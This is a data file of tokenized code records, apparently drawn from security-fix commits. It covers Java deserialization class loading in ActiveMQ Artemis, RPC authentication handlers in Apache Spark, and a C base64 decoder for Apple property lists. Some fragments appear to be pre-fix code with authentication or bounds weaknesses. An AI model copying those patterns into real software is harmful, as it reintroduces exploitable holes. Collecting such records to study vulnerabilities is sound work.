"ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ";", "import", "java", ".", "io", ".", "Serializable", ";", "public", "class", "EnclosingClass", "implements", "Serializable", "{", "public", "static", "Serializable", "anonymousObject", "=", "new", "Serializable", "(", ")", "{", "}", ";", "public", "static", "Object", "getLocalObject", "(", ")", "{", "class", "LocalClass", "implements", "Serializable", "{", "}", "return", "new", "LocalClass", "(", ");", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "22", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ";", "import", "java", ".", "io", ".", "Serializable", ";", "public", "class", "TestClass1", "implements", "Serializable", "{", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "22", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "tests", ".", "unit", ".", "util", ".", "deserialization", ".", "pkg1", ";", "import", "java", ".", "io", ".", "Serializable", ";", "public", "class", "TestClass2", "implements", "Serializable", "{", "}</s>return", "super", ".", "resolveClass", "(", "desc", ")", ";", "}", "else", "{", "return", "clazz", ";", "return", "super", ".", "resolveClass", "(", "desc", ")", ";", "return", "Proxy", ".", "getProxyClass", "(", "hasNonPublicInterface", "?", "nonPublicLoader", ":", "latestLoader", ",", "classObjs", ")", ";", "public", "ActiveMQConnection", "(", "final", "String", "username", ",", "return", "new", "ActiveMQXASession", "(", "this", ",", "transacted", ",", "true", ",", "acknowledgeMode", ",", "session", ",", "type", ")", ";", "return", "new", "ActiveMQSession", "(", "this", ",", "transacted", ",", "false", ",", "acknowledgeMode", ",", "session", ",", "type", ")", ";", "public", "class", "ActiveMQConnectionFactory", "implements", "Externalizable", ",", "Referenceable", ",", "ConnectionFactory", ",", "XAConnectionFactory", ",", "AutoCloseable", "{", "connection", "=", "new", "ActiveMQXAConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQXAConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQXAConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "connection", "=", "new", "ActiveMQConnection", "(", "username", ",", "password", ",", "type", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "factory", ")", ";", "msg", "=", "new", "ActiveMQObjectMessage", "(", "message", ",", "session", ")", ";", "protected", "ActiveMQMessageConsumer", "(", "final", "ActiveMQConnection", "connection", ",", "coreListener", "=", "listener", "=", "=", "null", "?", "null", ":", "new", "JMSMessageListenerWrapper", "(", "connection", ",", "session", ",", "consumer", ",", "listener", ",", "ackMode", ")", ";", "boolean", "needSession", "=", "ackMode", "=", "=", "Session", ".", "CLIENT_ACKNOWLEDGE", "|", "|", "ackMode", "=", "=", "ActiveMQJMSConstants", ".", "INDIVIDUAL_ACKNOWLEDGE", ";", "jmsMsg", "=", "ActiveMQMessage", ".", "createMessage", "(", "coreMessage", ",", "needSession", "?", "session", ".", "getCoreSession", "(", ")", ":", "null", ")", ";", "final", "ClientSession", "clientSession", ")", "throws", "JMSException", "{", "activeMQJmsMessage", "=", "new", "ActiveMQObjectMessage", "(", "(", "ObjectMessage", ")", "jmsMessage", ",", "clientSession", ")", ";", "import", "java", ".", "io", ".", "ObjectInputStream", ";", "protected", "ActiveMQObjectMessage", "(", "final", "ClientSession", "session", ")", "{", "protected", "ActiveMQObjectMessage", "(", "final", "ClientMessage", "message", ",", "final", "ClientSession", "session", ")", "{", "public", "ActiveMQObjectMessage", "(", "final", "ObjectMessage", "foreign", ",", "final", "ClientSession", "session", ")", "throws", "JMSException", "{", "try", "(", "ObjectInputStream", "ois", "=", "new", "ObjectInputStreamWithClassLoader", "(", "new", "ByteArrayInputStream", "(", "data", ")", "))", "{", "protected", "ActiveMQQueueBrowser", "(", "final", "ActiveMQQueue", "queue", ",", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "next", ",", "session", ")", ";", "protected", "ActiveMQSession", "(", "final", "ActiveMQConnection", "connection", ",", "return", "new", "ActiveMQObjectMessage", "(", "session", ")", ";", "ActiveMQObjectMessage", "msg", "=", "new", "ActiveMQObjectMessage", "(", "session", ")", ";", "return", "new", "ActiveMQMessageProducer", "(", "connection", ",", "producer", ",", "jbd", ",", "session", ")", ";", "ActiveMQMessageConsumer", "jbc", "=", "new", "ActiveMQMessageConsumer", "(", "connection", ",", "this", ",", "consumer", ",", "false", ",", "dest", ",", "selectorString", ",", "autoDeleteQueueName", ")", ";", "ActiveMQMessageConsumer", "jbc", "=", "new", "ActiveMQMessageConsumer", "(", "connection", ",", "this", ",", "consumer", ",", "noLocal", ",", "dest", ",", "selectorString", ",", "autoDeleteQueueName", ")", ";", "return", "new", "ActiveMQQueueBrowser", "(", "(", "ActiveMQQueue", ")", "jbq", ",", "filterString", ",", "session", ")", ";", "public", "ActiveMQXAConnection", "(", "final", "String", "username", ",", "super", "(", "username", ",", "password", ",", "connectionType", ",", "clientID", ",", "dupsOKBatchSize", ",", "transactionBatchSize", ",", "sessionFactory", ")", ";", "protected", "ActiveMQXASession", "(", "ActiveMQConnection", "connection", ",", "super", "(", "connection", ",", "transacted", ",", "xa", ",", "ackMode", ",", "session", ",", "sessionType", ")", ";", "protected", "JMSMessageListenerWrapper", "(", "final", "ActiveMQConnection", "connection", ",", "ActiveMQMessage", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "message", ",", "session", ".", "getCoreSession", "(", "))", ";", "BufferHelper", ".", "sizeOfNullableSimpleString", "(", "protocolManagerFactoryStr", ")", ";", "public", "class", "ConnectionFactoryProperties", "{", "ActiveMQMessageHandler", "handler", "=", "new", "ActiveMQMessageHandler", "(", "this", ",", "ra", ".", "getTM", "(", "),", "(", "ClientSessionInternal", ")", "session", ",", "cf", ",", "i", ")", ";", "public", "ActiveMQMessageHandler", "(", "final", "ActiveMQActivation", "activation", ",", "ActiveMQMessage", "msg", "=", "ActiveMQMessage", ".", "createMessage", "(", "message", ",", "session", ")", ";", "-", "`", "trustStorePath", "`", "-", "The", "path", "of", "the", "trust", "store", "file", ".", "This", "is", "needed", "only", "if", "`", "clientAuth", "`", "is", "`", "true", "`", ".", "-", "`", "trustStorePassword", "`", "-", "The", "trust", "store", "'", "s", "password", ".", "ActiveMQObjectMessage", "copy", "=", "new", "ActiveMQObjectMessage", "(", "foreignObjectMessage", ",", "session", ")", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "static", "ClassLoader", "newClassLoader", "(", "final", "Class", "anyUserClass", ")", "throws", "Exception", "{", "ProtectionDomain", "protectionDomain", "=", "anyUserClass", ".", "getProtectionDomain", "(", ");", "CodeSource", "codeSource", "=", "protectionDomain", ".", "getCodeSource", "(", ");", "URL", "classLocation", "=", "codeSource", ".", "getLocation", "(", ");", "pathIgnore", "=", "classLocation", ".", "toString", "(", ");", "if", "(", "!", "itemLocation", ".", "equals", "(", "classLocation", ")", "&", "&", "itemLocation", ".", "toString", "(", ").", "indexOf", "(", "pathIgnore", ")", ">", "=", "0", ")", "{", "ClassLoader", "appClassLoader", "=", "URLClassLoader", ".", "newInstance", "(", "new", "URL", "[", "]{", "classLocation", "}", ",", "masterClassLoader", ")", ";", "ClassLoader", "testClassLoader", "=", "ObjectInputStreamWithClassLoaderTest", ".", "newClassLoader", "(", "obj", ".", "getClass", "(", "))", ";", "ClassLoader", "testClassLoader", "=", "ObjectInputStreamWithClassLoaderTest", ".", "newClassLoader", "(", "this", ".", "getClass", "(", "))", ";"], "docstring_tokens": ["a", "message", "that", "was", "originally", "sent", "as", "an", "object", "message", "(cross", "protocol)"]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "apache", ".", "spark", ".", "network", ".", "server", ".", "AbstractAuthRpcHandler", ";", "class", "AuthRpcHandler", "extends", "AbstractAuthRpcHandler", "{", "/", "**", "RPC", "handler", "for", "auth", "handshake", "when", "falling", "back", "to", "SASL", "auth", ".", "*", "/", "SaslRpcHandler", "saslHandler", ";", "super", "(", "delegate", ")", ";", "protected", "boolean", "doAuthChallenge", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "if", "(", "saslHandler", "!", "=", "null", ")", "{", "return", "saslHandler", ".", "doAuthChallenge", "(", "client", ",", "message", ",", "callback", ")", ";", "saslHandler", "=", "new", "SaslRpcHandler", "(", "conf", ",", "channel", ",", "null", ",", "secretKeyHolder", ")", ";", "return", "saslHandler", ".", "doAuthChallenge", "(", "client", ",", "message", ",", "callback", ")", ";", "return", "false", ";", "return", "false", ";", "return", "true", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "server", ".", "AbstractAuthRpcHandler", ";", "public", "class", "SaslRpcHandler", "extends", "AbstractAuthRpcHandler", "{", "super", "(", "delegate", ")", ";", "public", "boolean", "doAuthChallenge", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "return", "true", ";", "return", "true", ";", "return", "false", ";", "super", ".", "channelInactive", "(", "client", ")", ";", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "spark", ".", "network", ".", "server", ";", "import", "java", ".", "nio", ".", "ByteBuffer", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "client", ".", "RpcResponseCallback", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "client", ".", "StreamCallbackWithID", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "client", ".", "TransportClient", ";", "/", "**", "*", "RPC", "Handler", "which", "performs", "authentication", ",", "and", "when", "it", "'", "s", "successful", ",", "delegates", "further", "*", "calls", "to", "another", "RPC", "handler", ".", "The", "authentication", "handshake", "itself", "should", "be", "implemented", "*", "by", "subclasses", ".", "*", "/", "public", "abstract", "class", "AbstractAuthRpcHandler", "extends", "RpcHandler", "{", "/", "**", "RpcHandler", "we", "will", "delegate", "to", "for", "authenticated", "connections", ".", "*", "/", "private", "final", "RpcHandler", "delegate", ";", "private", "boolean", "isAuthenticated", ";", "protected", "AbstractAuthRpcHandler", "(", "RpcHandler", "delegate", ")", "{", "this", ".", "delegate", "=", "delegate", ";", "}", "/", "**", "*", "Responds", "to", "an", "authentication", "challenge", ".", "*", "*", "@", "return", "Whether", "the", "client", "is", "authenticated", ".", "*", "/", "protected", "abstract", "boolean", "doAuthChallenge", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", ";", "@", "Override", "public", "final", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "if", "(", "isAuthenticated", ")", "{", "delegate", ".", "receive", "(", "client", ",", "message", ",", "callback", ")", ";", "}", "else", "{", "isAuthenticated", "=", "doAuthChallenge", "(", "client", ",", "message", ",", "callback", ")", ";", "}", "}", "@", "Override", "public", "final", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ")", "{", "if", "(", "isAuthenticated", ")", "{", "delegate", ".", "receive", "(", "client", ",", "message", ")", ";", "}", "else", "{", "throw", "new", "SecurityException", "(", "\"", "Unauthenticated", "call", "to", "receive", "(", ").", "\")", ";", "}", "}", "@", "Override", "public", "final", "StreamCallbackWithID", "receiveStream", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "if", "(", "isAuthenticated", ")", "{", "return", "delegate", ".", "receiveStream", "(", "client", ",", "message", ",", "callback", ")", ";", "}", "else", "{", "throw", "new", "SecurityException", "(", "\"", "Unauthenticated", "call", "to", "receiveStream", "(", ").", "\")", ";", "}", "}", "@", "Override", "public", "StreamManager", "getStreamManager", "(", ")", "{", "return", "delegate", ".", "getStreamManager", "(", ");", "}", "@", "Override", "public", "void", "channelActive", "(", "TransportClient", "client", ")", "{", "delegate", ".", "channelActive", "(", "client", ")", ";", "}", "@", "Override", "public", "void", "channelInactive", "(", "TransportClient", "client", ")", "{", "delegate", ".", "channelInactive", "(", "client", ")", ";", "}", "@", "Override", "public", "void", "exceptionCaught", "(", "Throwable", "cause", ",", "TransportClient", "client", ")", "{", "delegate", ".", "exceptionCaught", "(", "cause", ",", "client", ")", ";", "}", "public", "boolean", "isAuthenticated", "(", ")", "{", "return", "isAuthenticated", ";", "}", "}", "@", "@", "-", "34", ",", "7", "+", "34", ",", "6", "@", "@", "assertNull", "(", "ctx", ".", "authRpcHandler", ".", "saslHandler", ")", ";", "assertFalse", "(", "ctx", ".", "authRpcHandler", ".", "isAuthenticated", "(", "))", ";", "assertNotNull", "(", "ctx", ".", "authRpcHandler", ".", "saslHandler", ")", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "isAuthenticated", "(", "))", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "isAuthenticated", "(", "))", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "isAuthenticated", "(", "))", ";", "Method", "delegate", "=", "SaslRpcHandler", ".", "class", ".", "getMethod", "(", "m", ".", "getName", "(", "),", "m", ".", "getParameterTypes", "(", "))", ";", "assertNotEquals", "(", "delegate", ".", "getDeclaringClass", "(", "),", "RpcHandler", ".", "class", ")", ";</s>import", "org", ".", "apache", ".", "spark", ".", "network", ".", "client", ".", "StreamCallbackWithID", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "server", ".", "StreamManager", ";", "class", "AuthRpcHandler", "extends", "RpcHandler", "{", "/", "**", "*", "RpcHandler", "we", "will", "delegate", "to", "for", "authenticated", "connections", ".", "When", "falling", "back", "to", "SASL", "*", "this", "will", "be", "replaced", "with", "the", "SASL", "RPC", "handler", ".", "*", "/", "@", "VisibleForTesting", "RpcHandler", "delegate", ";", "/", "**", "Whether", "auth", "is", "done", "and", "future", "calls", "should", "be", "delegated", ".", "*", "/", "boolean", "doDelegate", ";", "this", ".", "delegate", "=", "delegate", ";", "public", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "if", "(", "doDelegate", ")", "{", "delegate", ".", "receive", "(", "client", ",", "message", ",", "callback", ")", ";", "return", ";", "delegate", "=", "new", "SaslRpcHandler", "(", "conf", ",", "channel", ",", "delegate", ",", "secretKeyHolder", ")", ";", "delegate", ".", "receive", "(", "client", ",", "message", ",", "callback", ")", ";", "doDelegate", "=", "true", ";", "return", ";", "return", ";", "doDelegate", "=", "true", ";", "}", "@", "Override", "public", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ")", "{", "delegate", ".", "receive", "(", "client", ",", "message", ")", ";", "}", "@", "Override", "public", "StreamCallbackWithID", "receiveStream", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "return", "delegate", ".", "receiveStream", "(", "client", ",", "message", ",", "callback", ")", ";", "@", "Override", "public", "StreamManager", "getStreamManager", "(", ")", "{", "return", "delegate", ".", "getStreamManager", "(", ");", "}", "@", "Override", "public", "void", "channelActive", "(", "TransportClient", "client", ")", "{", "delegate", ".", "channelActive", "(", "client", ")", ";", "}", "@", "Override", "public", "void", "channelInactive", "(", "TransportClient", "client", ")", "{", "delegate", ".", "channelInactive", "(", "client", ")", ";", "}", "@", "Override", "public", "void", "exceptionCaught", "(", "Throwable", "cause", ",", "TransportClient", "client", ")", "{", "delegate", ".", "exceptionCaught", "(", "cause", ",", "client", ")", ";", "}", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "client", ".", "StreamCallbackWithID", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "server", ".", "StreamManager", ";", "public", "class", "SaslRpcHandler", "extends", "RpcHandler", "{", "/", "**", "RpcHandler", "we", "will", "delegate", "to", "for", "authenticated", "connections", ".", "*", "/", "private", "final", "RpcHandler", "delegate", ";", "private", "boolean", "isComplete", ";", "private", "boolean", "isAuthenticated", ";", "this", ".", "delegate", "=", "delegate", ";", "this", ".", "isComplete", "=", "false", ";", "this", ".", "isAuthenticated", "=", "false", ";", "public", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "if", "(", "isComplete", ")", "{", "/", "/", "Authentication", "complete", ",", "delegate", "to", "base", "handler", ".", "delegate", ".", "receive", "(", "client", ",", "message", ",", "callback", ")", ";", "return", ";", "}", "return", ";", "return", ";", "}", "@", "Override", "public", "void", "receive", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ")", "{", "delegate", ".", "receive", "(", "client", ",", "message", ")", ";", "}", "@", "Override", "public", "StreamCallbackWithID", "receiveStream", "(", "TransportClient", "client", ",", "ByteBuffer", "message", ",", "RpcResponseCallback", "callback", ")", "{", "return", "delegate", ".", "receiveStream", "(", "client", ",", "message", ",", "callback", ")", ";", "}", "@", "Override", "public", "StreamManager", "getStreamManager", "(", ")", "{", "return", "delegate", ".", "getStreamManager", "(", ");", "}", "@", "Override", "public", "void", "channelActive", "(", "TransportClient", "client", ")", "{", "delegate", ".", "channelActive", "(", "client", ")", ";", "delegate", ".", "channelInactive", "(", "client", ")", ";", "@", "Override", "public", "void", "exceptionCaught", "(", "Throwable", "cause", ",", "TransportClient", "client", ")", "{", "delegate", ".", "exceptionCaught", "(", "cause", ",", "client", ")", ";", "}", "isComplete", "=", "true", ";", "import", "org", ".", "apache", ".", "spark", ".", "network", ".", "sasl", ".", "SaslRpcHandler", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "doDelegate", ")", ";", "assertFalse", "(", "ctx", ".", "authRpcHandler", ".", "delegate", "instanceof", "SaslRpcHandler", ")", ";", "assertFalse", "(", "ctx", ".", "authRpcHandler", ".", "doDelegate", ")", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "doDelegate", ")", ";", "assertTrue", "(", "ctx", ".", "authRpcHandler", ".", "doDelegate", ")", ";", "SaslRpcHandler", ".", "class", ".", "getDeclaredMethod", "(", "m", ".", "getName", "(", "),", "m", ".", "getParameterTypes", "(", "))", ";"], "docstring_tokens": ["via", "a", "shared", "secret", "."]}
{"contents": ["empty"], "code_tokens": ["52", ",", "53", ",", "54", ",", "55", ",", "56", ",", "57", ",", "58", ",", "59", ",", "60", ",", "61", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "2", ",", "-", "1", ",", "-", "1", ",", "int", "wv", ",", "w1", ",", "w2", ",", "w3", ",", "w4", ";", "int", "tmpval", "[", "4", "]", ";", "int", "tmpcnt", "=", "0", ";", "while", "(", "ptr", "<", "buf", "+", "len", "&", "&", "(", "*", "ptr", "=", "=", "'", "'", "|", "|", "*", "ptr", "=", "=", "'", "\\", "t", "'", "|", "|", "*", "ptr", "=", "=", "'", "\\", "n", "'", "|", "|", "*", "ptr", "=", "=", "'", "\\", "r", "'", "))", "{", "ptr", "+", "+;", "}", "if", "(", "(", "wv", "=", "base64_table", "[", "(", "int", ")", "(", "unsigned", "char", ")", "*", "ptr", "+", "+]", ")", "=", "=", "-", "1", ")", "{", "continue", ";", "}", "tmpval", "[", "tmpcnt", "+", "+]", "=", "wv", ";", "if", "(", "tmpcnt", "=", "=", "4", ")", "{", "tmpcnt", "=", "0", ";", "w1", "=", "tmpval", "[", "0", "]", ";", "w2", "=", "tmpval", "[", "1", "]", ";", "w3", "=", "tmpval", "[", "2", "]", ";", "w4", "=", "tmpval", "[", "3", "]", ";", "if", "(", "w2", ">", "=", "0", ")", "{", "outbuf", "[", "p", "+", "+]", "=", "(", "unsigned", "char", ")", "((", "(", "w1", "<", "<", "2", ")", "+", "(", "w2", ">", ">", "4", ")", ")", "&", "0xFF", ")", ";", "}", "if", "(", "w3", ">", "=", "0", ")", "{", "outbuf", "[", "p", "+", "+]", "=", "(", "unsigned", "char", ")", "((", "(", "w2", "<", "<", "4", ")", "+", "(", "w3", ">", ">", "2", ")", ")", "&", "0xFF", ")", ";", "}", "if", "(", "w4", ">", "=", "0", ")", "{", "outbuf", "[", "p", "+", "+]", "=", "(", "unsigned", "char", ")", "((", "(", "w3", "<", "<", "6", ")", "+", "w4", ")", "&", "0xFF", ")", ";", "}</s>-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "62", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "63", ",", "52", ",", "53", ",", "54", ",", "55", ",", "56", ",", "57", ",", "58", ",", "59", ",", "60", ",", "61", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ",", "0", ",", "1", ",", "2", ",", "3", ",", "4", ",", "5", ",", "6", ",", "7", ",", "8", ",", "9", ",", "10", ",", "11", ",", "12", ",", "13", ",", "14", ",", "-", "1", ",", "26", ",", "27", ",", "28", ",", "29", ",", "30", ",", "31", ",", "32", ",", "33", ",", "34", ",", "35", ",", "36", ",", "37", ",", "38", ",", "39", ",", "40", ",", "static", "int", "base64decode_block", "(", "unsigned", "char", "*", "target", ",", "const", "char", "*", "data", ",", "size_t", "data_size", ")", "{", "int", "w1", ",", "w2", ",", "w3", ",", "w4", ";", "int", "i", ";", "size_t", "n", ";", "if", "(", "!", "data", "|", "|", "(", "data_size", "<", "=", "0", ")", ")", "{", "return", "0", ";", "}", "n", "=", "0", ";", "i", "=", "0", ";", "while", "(", "n", "<", "data_size", "-", "3", ")", "{", "w1", "=", "base64_table", "[", "(", "int", ")", "data", "[", "n", "]", "];", "w2", "=", "base64_table", "[", "(", "int", ")", "data", "[", "n", "+", "1", "]", "];", "w3", "=", "base64_table", "[", "(", "int", ")", "data", "[", "n", "+", "2", "]", "];", "w4", "=", "base64_table", "[", "(", "int", ")", "data", "[", "n", "+", "3", "]", "];", "if", "(", "w2", ">", "=", "0", ")", "{", "target", "[", "i", "+", "+]", "=", "(", "char", ")", "((", "w1", "*", "4", "+", "(", "w2", ">", ">", "4", ")", ")", "&", "255", ")", ";", "}", "if", "(", "w3", ">", "=", "0", ")", "{", "target", "[", "i", "+", "+]", "=", "(", "char", ")", "((", "w2", "*", "16", "+", "(", "w3", ">", ">", "2", ")", ")", "&", "255", ")", ";", "}", "if", "(", "w4", ">", "=", "0", ")", "{", "target", "[", "i", "+", "+]", "=", "(", "char", ")", "((", "w3", "*", "64", "+", "w4", ")", "&", "255", ")", ";", "}", "n", "+", "=", "4", ";", "}", "return", "i", ";", "}", "size_t", "l", "=", "0", ";", "ptr", "+", "=", "strspn", "(", "ptr", ",", "\"", "\\", "r", "\\", "n", "\\", "t", "\"", ");", "l", "=", "strcspn", "(", "ptr", ",", "\"", "\\", "r", "\\", "n", "\\", "t", "\"", ");", "if", "(", "l", ">", "3", "&", "&", "ptr", "+", "l", "<", "=", "buf", "+", "len", ")", "{", "p", "+", "=", "base64decode_block", "(", "outbuf", "+", "p", ",", "ptr", ",", "l", ")", ";", "ptr", "+", "=", "l", ";", "}", "else", "{", "break", ";"], "docstring_tokens": ["via", "split", "encoded", "Apple", "Property", "List", "data", "."]}
